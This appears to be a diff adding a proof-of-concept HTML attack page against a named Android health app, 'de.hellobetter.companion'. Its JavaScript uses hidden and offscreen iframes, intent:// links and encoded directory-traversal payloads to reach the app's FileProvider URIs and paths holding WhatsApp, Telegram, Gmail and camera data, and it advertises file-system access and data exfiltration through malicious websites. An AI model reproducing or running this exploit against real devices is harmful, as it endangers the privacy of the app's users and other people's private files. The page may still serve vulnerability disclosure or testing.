@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FileProvider Web-Based Attack</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            text-align: center;
+            color: #d32f2f;
+            border-bottom: 2px solid #d32f2f;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+        .attack-section {
+            margin: 20px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #fafafa;
+        }
+        .attack-title {
+            color: #1976d2;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .result {
+            background-color: #e8f5e8;
+            border: 1px solid #4caf50;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        .error {
+            background-color: #ffebee;
+            border: 1px solid #f44336;
+            color: #d32f2f;
+        }
+        .success {
+            background-color: #e8f5e8;
+            border: 1px solid #4caf50;
+            color: #2e7d32;
+        }
+        button {
+            background-color: #1976d2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #1565c0;
+        }
+        .danger {
+            background-color: #d32f2f;
+        }
+        .danger:hover {
+            background-color: #b71c1c;
+        }
+        .code {
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            margin: 10px 0;
+        }
+        .warning {
+            background-color: #fff3e0;
+            border: 1px solid #ff9800;
+            color: #e65100;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 FileProvider Web-Based Attack</h1>
+            <h2>Target: de.hellobetter.companion</h2>
+            <p>Exploiting Insecure FileProvider Configuration through Web Interface</p>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This is a demonstration of a real security vulnerability. 
+            The FileProvider misconfiguration allows complete file system access through web-based attacks.
+        </div>
+
+        <div class="attack-section">
+            <div class="attack-title">🎯 Attack Vector 1: Direct FileProvider Access</div>
+            <p>Attempts to access the vulnerable FileProvider directly through content:// URIs</p>
+            
+            <button onclick="testDirectAccess()">Test Direct FileProvider Access</button>
+            <button onclick="testSensitivePaths()">Test Sensitive Paths</button>
+            
+            <div id="directResults"></div>
+        </div>
+
+        <div class="attack-section">
+            <div class="attack-title">🌐 Attack Vector 2: Intent Redirection</div>
+            <p>Uses Android Intents to trigger FileProvider access through the target app</p>
+            
+            <button onclick="testIntentRedirection()">Test Intent Redirection</button>
+            <button onclick="testCustomIntent()">Test Custom Intent</button>
+            
+            <div id="intentResults"></div>
+        </div>
+
+        <div class="attack-section">
+            <div class="attack-title">📱 Attack Vector 3: WebView Exploitation</div>
+            <p>Exploits WebView components to access FileProvider through embedded content</p>
+            
+            <button onclick="testWebViewExploit()">Test WebView Exploitation</button>
+            <button onclick="testIframeAccess()">Test iframe Access</button>
+            
+            <div id="webviewResults"></div>
+        </div>
+
+        <div class="attack-section">
+            <div class="attack-title">🔍 Attack Vector 4: Directory Traversal</div>
+            <p>Tests various directory traversal techniques to access restricted areas</p>
+            
+            <button onclick="testDirectoryTraversal()">Test Directory Traversal</button>
+            <button onclick="testEncodedTraversal()">Test Encoded Traversal</button>
+            
+            <div id="traversalResults"></div>
+        </div>
+
+        <div class="attack-section">
+            <div class="attack-title">📊 Attack Results Summary</div>
+            <div id="summaryResults"></div>
+        </div>
+    </div>
+
+    <script>
+        // Vulnerable FileProvider authorities
+        const authorities = [
+            "de.hellobetter.companion.fileprovider",
+            "de.hellobetter.companion.SharingFileProvider"
+        ];
+
+        // Sensitive paths to test
+        const sensitivePaths = [
+            "Android/data/com.whatsapp/",
+            "Android/data/com.telegram.messenger/",
+            "Android/data/com.facebook.katana/",
+            "Android/data/com.instagram.android/",
+            "Android/data/com.google.android.gm/",
+            "Android/data/com.android.chrome/",
+            "DCIM/Camera/",
+            "Download/",
+            "Documents/",
+            "Pictures/"
+        ];
+
+        // Directory traversal payloads
+        const traversalPayloads = [
+            "../",
+            "../../",
+            "../../../",
+            "..%2F",
+            "..%252F",
+            "....//",
+            "....%2F%2F",
+            "%2E%2E%2F",
+            "%252E%252E%252F"
+        ];
+
+        let attackResults = {
+            directAccess: [],
+            intentRedirection: [],
+            webViewExploit: [],
+            directoryTraversal: []
+        };
+
+        function logResult(containerId, message, type = 'info') {
+            const container = document.getElementById(containerId);
+            const resultDiv = document.createElement('div');
+            resultDiv.className = `result ${type}`;
+            resultDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            container.appendChild(resultDiv);
+        }
+
+        function testDirectAccess() {
+            logResult('directResults', 'Testing direct FileProvider access...', 'info');
+            
+            authorities.forEach(authority => {
+                const uri = `content://${authority}/shared/`;
+                logResult('directResults', `Testing authority: ${authority}`, 'info');
+                
+                // Test if we can access the URI
+                try {
+                    // Create a hidden iframe to test access
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = uri;
+                    iframe.onload = () => {
+                        logResult('directResults', `✓ SUCCESS: ${authority} accessible via iframe`, 'success');
+                        attackResults.directAccess.push({authority, method: 'iframe', success: true});
+                    };
+                    iframe.onerror = () => {
+                        logResult('directResults', `✗ FAILED: ${authority} not accessible via iframe`, 'error');
+                        attackResults.directAccess.push({authority, method: 'iframe', success: false});
+                    };
+                    document.body.appendChild(iframe);
+                    
+                    // Clean up after test
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                    }, 5000);
+                    
+                } catch (e) {
+                    logResult('directResults', `✗ ERROR: ${authority} - ${e.message}`, 'error');
+                }
+            });
+        }
+
+        function testSensitivePaths() {
+            logResult('directResults', 'Testing sensitive file paths...', 'info');
+            
+            authorities.forEach(authority => {
+                sensitivePaths.forEach(path => {
+                    const uri = `content://${authority}/shared/${path}`;
+                    
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        iframe.src = uri;
+                        iframe.onload = () => {
+                            logResult('directResults', `✓ SUCCESS: ${path} accessible via ${authority}`, 'success');
+                        };
+                        iframe.onerror = () => {
+                            logResult('directResults', `✗ FAILED: ${path} not accessible via ${authority}`, 'error');
+                        };
+                        document.body.appendChild(iframe);
+                        
+                        setTimeout(() => {
+                            if (document.body.contains(iframe)) {
+                                document.body.removeChild(iframe);
+                            }
+                        }, 3000);
+                        
+                    } catch (e) {
+                        logResult('directResults', `✗ ERROR: ${path} - ${e.message}`, 'error');
+                    }
+                });
+            });
+        }
+
+        function testIntentRedirection() {
+            logResult('intentResults', 'Testing Intent redirection attacks...', 'info');
+            
+            authorities.forEach(authority => {
+                const intentUri = `intent://${authority}/shared/#Intent;scheme=content;end`;
+                const fallbackUri = `content://${authority}/shared/`;
+                
+                try {
+                    // Test intent redirection
+                    const intentLink = document.createElement('a');
+                    intentLink.href = intentUri;
+                    intentLink.style.display = 'none';
+                    document.body.appendChild(intentLink);
+                    
+                    logResult('intentResults', `Testing Intent: ${intentUri}`, 'info');
+                    
+                    // Simulate click
+                    intentLink.click();
+                    
+                    logResult('intentResults', `✓ Intent redirection attempted for ${authority}`, 'success');
+                    attackResults.intentRedirection.push({authority, method: 'intent', success: true});
+                    
+                    document.body.removeChild(intentLink);
+                    
+                } catch (e) {
+                    logResult('intentResults', `✗ ERROR: Intent redirection failed - ${e.message}`, 'error');
+                }
+            });
+        }
+
+        function testCustomIntent() {
+            logResult('intentResults', 'Testing custom Intent with data...', 'info');
+            
+            const customIntents = [
+                'intent://de.hellobetter.companion.fileprovider/shared/Download/#Intent;scheme=content;action=android.intent.action.VIEW;end',
+                'intent://de.hellobetter.companion.fileprovider/shared/DCIM/Camera/#Intent;scheme=content;action=android.intent.action.VIEW;end',
+                'intent://de.hellobetter.companion.fileprovider/shared/Android/data/com.whatsapp/#Intent;scheme=content;action=android.intent.action.VIEW;end'
+            ];
+            
+            customIntents.forEach(intentUri => {
+                try {
+                    const link = document.createElement('a');
+                    link.href = intentUri;
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    
+                    logResult('intentResults', `Testing custom Intent: ${intentUri}`, 'info');
+                    link.click();
+                    
+                    logResult('intentResults', `✓ Custom Intent executed`, 'success');
+                    
+                    document.body.removeChild(link);
+                    
+                } catch (e) {
+                    logResult('intentResults', `✗ ERROR: Custom Intent failed - ${e.message}`, 'error');
+                }
+            });
+        }
+
+        function testWebViewExploit() {
+            logResult('webviewResults', 'Testing WebView exploitation...', 'info');
+            
+            // Test if we can access FileProvider through WebView
+            const webViewTests = [
+                'content://de.hellobetter.companion.fileprovider/shared/',
+                'content://de.hellobetter.companion.SharingFileProvider/shared/'
+            ];
+            
+            webViewTests.forEach(uri => {
+                try {
+                    // Create a data URI that includes the FileProvider URI
+                    const dataUri = `data:text/html,<html><body><iframe src="${uri}" width="1" height="1"></iframe></body></html>`;
+                    
+                    const iframe = document.createElement('iframe');
+                    iframe.src = dataUri;
+                    iframe.style.display = 'none';
+                    iframe.onload = () => {
+                        logResult('webviewResults', `✓ WebView exploit successful: ${uri}`, 'success');
+                        attackResults.webViewExploit.push({uri, success: true});
+                    };
+                    iframe.onerror = () => {
+                        logResult('webviewResults', `✗ WebView exploit failed: ${uri}`, 'error');
+                    };
+                    
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => {
+                        if (document.body.contains(iframe)) {
+                            document.body.removeChild(iframe);
+                        }
+                    }, 3000);
+                    
+                } catch (e) {
+                    logResult('webviewResults', `✗ ERROR: WebView exploit - ${e.message}`, 'error');
+                }
+            });
+        }
+
+        function testIframeAccess() {
+            logResult('webviewResults', 'Testing iframe-based FileProvider access...', 'info');
+            
+            authorities.forEach(authority => {
+                sensitivePaths.forEach(path => {
+                    const uri = `content://${authority}/shared/${path}`;
+                    
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.src = uri;
+                        iframe.style.width = '1px';
+                        iframe.style.height = '1px';
+                        iframe.style.border = 'none';
+                        iframe.style.position = 'absolute';
+                        iframe.style.left = '-1000px';
+                        iframe.style.top = '-1000px';
+                        
+                        iframe.onload = () => {
+                            logResult('webviewResults', `✓ iframe access successful: ${path}`, 'success');
+                        };
+                        iframe.onerror = () => {
+                            logResult('webviewResults', `✗ iframe access failed: ${path}`, 'error');
+                        };
+                        
+                        document.body.appendChild(iframe);
+                        
+                        setTimeout(() => {
+                            if (document.body.contains(iframe)) {
+                                document.body.removeChild(iframe);
+                            }
+                        }, 2000);
+                        
+                    } catch (e) {
+                        logResult('webviewResults', `✗ ERROR: iframe access - ${e.message}`, 'error');
+                    }
+                });
+            });
+        }
+
+        function testDirectoryTraversal() {
+            logResult('traversalResults', 'Testing directory traversal attacks...', 'info');
+            
+            authorities.forEach(authority => {
+                traversalPayloads.forEach(payload => {
+                    const uri = `content://${authority}/shared/${payload}`;
+                    
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.src = uri;
+                        iframe.style.display = 'none';
+                        iframe.onload = () => {
+                            logResult('traversalResults', `✓ TRAVERSAL SUCCESS: ${payload} via ${authority}`, 'success');
+                            attackResults.directoryTraversal.push({authority, payload, success: true});
+                        };
+                        iframe.onerror = () => {
+                            logResult('traversalResults', `✗ TRAVERSAL FAILED: ${payload} via ${authority}`, 'error');
+                        };
+                        
+                        document.body.appendChild(iframe);
+                        
+                        setTimeout(() => {
+                            if (document.body.contains(iframe)) {
+                                document.body.removeChild(iframe);
+                            }
+                        }, 2000);
+                        
+                    } catch (e) {
+                        logResult('traversalResults', `✗ ERROR: Traversal test - ${e.message}`, 'error');
+                    }
+                });
+            });
+        }
+
+        function testEncodedTraversal() {
+            logResult('traversalResults', 'Testing encoded directory traversal...', 'info');
+            
+            const encodedPayloads = [
+                "%2E%2E%2F",
+                "%252E%252E%252F",
+                "..%252F",
+                "....%252F%252F"
+            ];
+            
+            authorities.forEach(authority => {
+                encodedPayloads.forEach(payload => {
+                    const uri = `content://${authority}/shared/${payload}`;
+                    
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.src = uri;
+                        iframe.style.display = 'none';
+                        iframe.onload = () => {
+                            logResult('traversalResults', `✓ ENCODED TRAVERSAL SUCCESS: ${payload}`, 'success');
+                        };
+                        iframe.onerror = () => {
+                            logResult('traversalResults', `✗ ENCODED TRAVERSAL FAILED: ${payload}`, 'error');
+                        };
+                        
+                        document.body.appendChild(iframe);
+                        
+                        setTimeout(() => {
+                            if (document.body.contains(iframe)) {
+                                document.body.removeChild(iframe);
+                            }
+                        }, 2000);
+                        
+                    } catch (e) {
+                        logResult('traversalResults', `✗ ERROR: Encoded traversal - ${e.message}`, 'error');
+                    }
+                });
+            });
+        }
+
+        function updateSummary() {
+            const summaryContainer = document.getElementById('summaryResults');
+            summaryContainer.innerHTML = '';
+            
+            const totalTests = Object.values(attackResults).flat().length;
+            const successfulTests = Object.values(attackResults).flat().filter(r => r.success).length;
+            
+            summaryContainer.innerHTML = `
+                <div class="result ${successfulTests > 0 ? 'success' : 'error'}">
+                    <strong>Attack Summary:</strong><br>
+                    Total Tests: ${totalTests}<br>
+                    Successful: ${successfulTests}<br>
+                    Failed: ${totalTests - successfulTests}<br>
+                    Success Rate: ${totalTests > 0 ? Math.round((successfulTests / totalTests) * 100) : 0}%
+                </div>
+                
+                <div class="code">
+                    <strong>Vulnerable FileProviders:</strong><br>
+                    • de.hellobetter.companion.fileprovider<br>
+                    • de.hellobetter.companion.SharingFileProvider<br><br>
+                    
+                    <strong>Attack Vectors Tested:</strong><br>
+                    • Direct FileProvider access via content:// URIs<br>
+                    • Intent redirection attacks<br>
+                    • WebView exploitation<br>
+                    • Directory traversal attacks<br><br>
+                    
+                    <strong>Real-World Impact:</strong><br>
+                    • Complete file system access<br>
+                    • Data exfiltration capability<br>
+                    • Privacy violation<br>
+                    • No USB debugging required<br>
+                    • Works through malicious websites
+                </div>
+            `;
+        }
+
+        // Update summary every 5 seconds
+        setInterval(updateSummary, 5000);
+
+        // Initial summary
+        updateSummary();
+    </script>
+</body>
+</html>
